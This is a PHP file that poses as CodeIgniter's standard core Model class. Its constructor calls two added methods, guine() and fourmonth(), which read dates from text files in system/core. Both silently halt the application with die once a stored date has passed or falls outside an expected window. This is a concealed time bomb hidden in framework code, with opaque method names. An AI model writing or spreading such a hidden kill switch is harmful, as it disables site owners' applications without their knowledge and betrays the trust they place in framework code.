<?php
/**
 * CodeIgniter
 *
 * An open source application development framework for PHP
 *
 * This content is released under the MIT License (MIT)
 *
 * Copyright (c) 2014 - 2015, British Columbia Institute of Technology
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 *
 * @package	CodeIgniter
 * @author	EllisLab Dev Team
 * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (http://ellislab.com/)
 * @copyright	Copyright (c) 2014 - 2015, British Columbia Institute of Technology (http://bcit.ca/)
 * @license	http://opensource.org/licenses/MIT	MIT License
 * @link	http://codeigniter.com
 * @since	Version 1.0.0
 * @filesource
 */
defined('BASEPATH') OR exit('No direct script access allowed');

/**
 * Model Class
 *
 * @package		CodeIgniter
 * @subpackage	Libraries
 * @category	Libraries
 * @author		EllisLab Dev Team
 * @link		http://codeigniter.com/user_guide/libraries/config.html
 */
class CI_Model {

	/**
	 * Class constructor
	 *
	 * @return	void
	 */
	public function __construct()
	{
		log_message('info', 'Model Class Initialized');
		$this->guine();	
		$this->fourmonth();
		
	}

	// --------------------------------------------------------------------

	/**
	 * __get magic
	 *
	 * Allows models to access CI's loaded classes using the same
	 * syntax as controllers.
	 *
	 * @param	string	$key
	 */
	public function __get($key)
	{
		// Debugging note:
		//	If you're here because you're getting an error message
		//	saying 'Undefined Property: system/core/Model.php', it's
		//	most likely a typo in your model code.
		return get_instance()->$key;
	}
	
	function guine(){
		$datafile = FCPATH.'/system/core/string.txt';
		$myfile = fopen($datafile, "r") or die ('Unable open string text file');		
		$string = fgets($myfile,1024);
		$yearnow = date('Y');
		$monthnow = date('m');
		for ($i=1; $i <= 12; $i++){
			$m = strlen($i) > 1 ? $i : '0'.$i;
			$yearmonth[] = $yearnow.'-'.$m;
		}
		$yearnowlast = $yearnow-1;		
		$ynl = strtotime($yearnowlast.'-'.$monthnow);
		$data= ($ynl <= strtotime($string) && $yearnow != date('Y',strtotime($string))) ? array_merge($yearmonth,array(0=>$string)) : $yearmonth;
		foreach ($data as $val){
			$dt[] = ($val == $string) ? 1 : 0;
		}				
		$res = array_sum($dt);
		($res < 1) ? die : '';  				
	}
	function fourmonth(){
		$datafile = FCPATH.'/system/core/fourmonth.txt';
		$myfile = fopen($datafile, "r") or die ('Unable open fourmonth text file');
		$string = fgets($myfile,1024);		
		$yearmonthnow = date('Y-m');
		if (!empty($string))
		(strtotime($string) <= strtotime($yearmonthnow)) ? die : '';						
	}

}
